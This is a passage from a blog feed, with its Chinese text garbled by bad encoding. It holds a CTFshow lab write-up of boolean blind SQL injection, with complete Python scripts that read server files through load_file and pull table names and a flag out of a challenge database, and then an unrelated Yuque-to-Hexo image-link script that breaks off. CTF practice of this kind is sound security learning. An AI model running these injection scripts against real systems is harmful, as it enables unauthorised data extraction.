0ã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬ã€‚<br>è¿™ä¸ªè„šæœ¬æœ€å¼€å§‹æ¯å¤ªæƒ³å‡ºæ¥æ€ä¹ˆå†™ï¼Œçœ‹äº†ä¸‹å¤§ä½¬ä»¬çš„wpï¼Œæ‰æ˜ç™½ã€‚è¿™é‡Œä¼šå°†wpä¸­çš„è„šæœ¬ä¹Ÿåˆ—ä¸¾å‡ºæ¥ã€‚<br>è„šæœ¬çš„æ€è·¯å°±æ˜¯ï¼Œå…ˆæœç´¢åˆ°flagçš„ä½ç½®ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥ç»™ä»–è¯»å‡ºæ¥ã€‚<br>ç›²æ³¨éœ€è¦æ‰¾åˆ°å›æ˜¾çš„åœ°æ–¹ã€‚<br>å¯ä»¥æ³¨æ„åˆ°ï¼Œå¯†ç ä¸º0æ—¶ï¼Œå½“è´¦å·ä¸º0ï¼Œè¿”å›çš„æ˜¯å¯†ç é”™è¯¯<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075241167-f497b6be-cc54-40e6-8a25-06d580071436.png" alt="image.png"><br>å½“è´¦å·ä¸º1æ—¶ï¼Œè¿”å›çš„æ˜¯æŸ¥è¯¢å¤±è´¥<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075274763-4a0331a8-9216-4583-ae04-4d2e80f13121.png" alt="image.png"><br>å‹¾<del>å§ï¼Œpayloadæµ‹è¯•ä¸€åŠä¸èƒ½ç”¨äº†ï¼Œä»¥ä¸ºæ˜¯å†™é”™äº†ï¼Œé‡å¯é¶åœºå°±å¥½äº†ã€‚</del><br>ç”¨ä¸‹é¢è¿™ä¸ªæ¥çœ‹æ˜¯ä»€ä¹ˆå­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr(load_file(<span class="string">&#x27;/var/www/html/api/index.php&#x27;</span>),&#123;&#125;,<span class="number">1</span>)=(<span class="string">&#x27;&#123;&#125;&#x27;</span>),<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å‹¾å§é¢˜ï¼Œ wpå¾ˆå¥½ç†è§£ï¼Œè„šæœ¬å†™äº†ä¸‰ä¸ªå°æ—¶æ•´ã€‚<br>6ç‚¹48å¼€å§‹å†™ 9ç‚¹48æ‰å†™å®Œã€‚å¤ªæŠ½è±¡äº†<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689083298083-26b2335c-3036-4323-a955-54b23f46827f.png" alt="image.png"><br>pythonåŸºç¡€å¤ªå·®äº†ï¼Œå°±è¿™è¿˜æ˜¯ç…§ç€wpçš„è§£æ³•å†™çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 18:48   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2daeac7e-8170-4826-9997-2b4a8a6ec9ca.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqr-stuvwxyz0123456789&#123;&lt;&gt;$=,;_ &#125;&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆæ‰¾flagåœ¨å“ªï¼š</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">1000</span>  <span class="comment"># è¿™é‡Œæ ¹æ®å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  <span class="comment"># //flooræ•´é™¤</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;if(locate(&quot;&#x27;</span> + flag_pre + <span class="string">&#x27;&quot;,load_file(&quot;/var/www/html/api/index.php&quot;))&gt;&#123;&#125;,0,1)&#x27;</span>.<span class="built_in">format</span>(mid),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">pos1, flag_pre1, stra</span>):</span><br><span class="line">    pos1 += <span class="built_in">len</span>(flag_pre1)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> stra:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(pos1), j),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                flag_pre1 += j</span><br><span class="line">                pos1 += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">        <span class="built_in">print</span>(flag_pre1)</span><br><span class="line">    <span class="keyword">return</span> flag_pre1</span><br><span class="line"></span><br><span class="line">pos = find_flag()</span><br><span class="line"><span class="built_in">print</span>(get_flag(pos, flag_pre, str1))</span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„-1"><a href="#æ³¨æ„-1" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>è¿™é‡Œé¢payloadæ˜¯ä¸èƒ½ä½¿ç”¨å•å¼•å·çš„ï¼Œå•å¼•å·ä¼šå¯¼è‡´å‰é¢é—­åˆä»¥è‡³äºä¸èƒ½å¤ŸæŸ¥è¯¢ã€‚è¦ä½¿ç”¨åŒå¼•å·ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075867993-0f9922b1-6204-4e3a-842a-5063ace97744.png" alt="image.png"></p><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><p>åœ¨æŸ¥è¯¢è¯­å¥é‡Œé¢åŠ äº†å•å¼•å·<code>username = &#39;&#123;$username&#125;&#39;</code><br>ä¸ç”¨è¯»æ–‡ä»¶äº†ï¼Œç›´æ¥å°±è¯»æ•°æ®å°±å¯ä»¥ã€‚<br>payloadï¼š<br><code>username=admin&#39;||1||&#39;</code><br>é‚£å°±å¯ä»¥æŠŠä¸Šé¢é‚£ä¸ªpayloadå»æ‰ç¬¬ä¸€æ®µæ–¹æ³•ã€‚<br>æ‰¾åˆ°å¸ƒå°”ç›²æ³¨æ„é€ ä½ç½®ï¼š<br><code>username=admin&#39;and+0#&amp;password=0</code>ï¼š<br>è¿”å›ç”¨æˆ·åä¸å­˜åœ¨<br><code>username=admin&#39;and+1#&amp;password=0</code>ï¼š<br>è¿”å›å¯†ç é”™è¯¯<br>ç”±æ­¤ç¼–å†™è„šæœ¬ï¼šï¼ˆ20minï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ†åˆ«ä¿®æ”¹payloadå‚æ•°å¯ä»¥å¾—åˆ°éœ€è¦çš„åç§°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>ctfshow_fl0g,ctfshow_user</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>id,f1ag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLå¸ƒå°”ç›²æ³¨2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;å¯†ç é”™è¯¯&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚æœè„šæœ¬ç¼–å†™å¼‚å¸¸ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br></pre></td></tr></table></figure><p>è¿™ä¿©ç©åº”æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚<br>å¦‚æœç”±äºå› ä¸ºå¤ªå¿«å¯¼è‡´çš„jsonæŠ¥é”™ï¼Œå¯ä»¥æ‰‹åŠ¨åŠ ä¸€è¡Œä¼‘çœ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><p>å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Pythonè„šæœ¬ä¿®æ”¹è¯­é›€å¯¼æ–‡ä»¶å›¾ç‰‡æ ¼å¼</title>
      <link href="/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/"/>
      <url>/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>ç”¨äº†è¯­é›€çš„mdç¼–è¾‘å™¨ï¼Œæ„Ÿè§‰typoraæœ‰ç‚¹ç”¨ä¸æƒ¯ï¼Œä½†æ˜¯è¯­é›€çš„åˆ°å¤„å›¾ç‰‡ä¼šæœ‰é™åˆ¶ï¼Œè™½ç„¶èƒ½å¤Ÿæµè§ˆï¼Œä½†æ˜¯ä½¿ç”¨hexoä¹‹åå°±ä¸è¡Œäº†ï¼Œå¯»æ‰¾äº†å‡ ä¸ªæ–¹æ³•ï¼Œæœ€å¥½ç”¨çš„å°±æ˜¯ä¿®æ”¹å›¾ç‰‡æ ¼å¼ï¼Œå°†åœ°å€åçš„å‚æ•°åˆ é™¤æ‰ã€‚<br>ä¸€ä¸ªä¸€ä¸ªæ”¹å¤ªè´¹åŠ²äº†ï¼Œå› æ­¤å†™äº†ä¸€ä¸ªç®€å•çš„pythonè„šæœ¬æ¥ä»£æ›¿æœºæ¢°åŠ³åŠ¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   YuQueShareLink.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/5/16 21:04   natro92      1.0         å°†è¯­é›€é“¾æ¥åœ¨å¯¼å‡ºåˆ°åšå®¢æ—¶å¯ä»¥æ­£å¸¸ä½¿ç”¨</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_string_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¿›è¡Œæ›¿æ¢æ“ä½œ</span></span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.png)&quot;</span>, <span class="string">&quot;.png)&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(replaced_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·æä¾›éœ€è¦å¤„ç†çš„æ–‡ä»¶è·¯å¾„, ä¸”æ–‡ä»¶éœ€è¦å’Œè¯¥pyè„šæœ¬å¤„åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œæ¯”å¦‚ï¼šæˆ‘çš„åšå®¢.md&quot;</span>)</span><br><span class="line">    file_path = <span class="built_in">input</span>(<span class="string">&quot;è·¯å¾„ï¼š&quot;</span>)</span><br><span class="line">    is_end_of_md = re.search(<span class="string">r&quot;\.md&quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_end_of_md:</span><br><span class="line">        file_path += <span class="string">&quot;.md&quot;</span></span><br><span class="line">    replace_string_in_file(file_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”¹å®Œè¿™ä¸ªäº†ï¼Œæƒ³è¦åŒæ­¥åˆ°hexoï¼Œéœ€è¦æœ‰ä¸€æ­¥<code>hexo new æ–‡ç« åç§°</code>ï¼Œè¿™æ ·ä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤´ï¼Œä¸€èˆ¬æˆ‘ä¼šæŠŠè¿™ä¸ªä¿®æ”¹åçš„æ–‡ç« å†…å®¹å¤åˆ¶åˆ°é‚£ä¸ªæ–°ç”Ÿæˆçš„æ–‡ä»¶ï¼Œå¹¶ä¸”ä¿®æ”¹tagã€categoryç­‰å‚æ•°ã€‚<br>é‚£ä¹ˆèƒ½ä¸èƒ½ç›´æ¥æŠŠè¿™äº›ä¸œè¥¿éƒ½åˆå¹¶åˆ°ä¸€èµ·å‘¢ï¼Ÿ<br>é€šè¿‡ä¸‡èƒ½çš„äº’è”ç½‘ï¼Œæ·»åŠ ä¸€ç‚¹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_headers_in_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    file_name = os.path.basename(file_path)</span><br><span class="line">    replaced_content = re.sub(<span class="string">r&quot;.md&quot;</span>, <span class="string">&quot;&quot;</span>, file_name)</span><br><span class="line">    time_str = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        contents = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å½“å‰tags:&#x27;</span>, [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;å½“å‰categories:&#x27;</span>, [<span class="string">&#x27;CTF&#x27;</span>])</span><br><span class="line">        new_tags = <span class="built_in">input</span>(<span class="string">&#x27;ä½ æƒ³è¦ä¿®æ”¹tagså—ï¼Ÿ (y/n) é»˜è®¤n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_tags.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            tags_str = <span class="built_in">input</span>(<span class="string">&#x27;è¾“å…¥ä½ çš„tagsï¼Œæ³¨æ„ç”¨è‹±æ–‡é€—å·åˆ†éš”: &#x27;</span>)</span><br><span class="line">            tags = [tag.strip() <span class="keyword">for</span> tag <span class="keyword">in</span> tags_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tags = [<span class="string">&#x27;WriteUp&#x27;</span>, <span class="string">&#x27;CTFshow0-1&#x27;</span>]</span><br><span class="line"></span><br><span 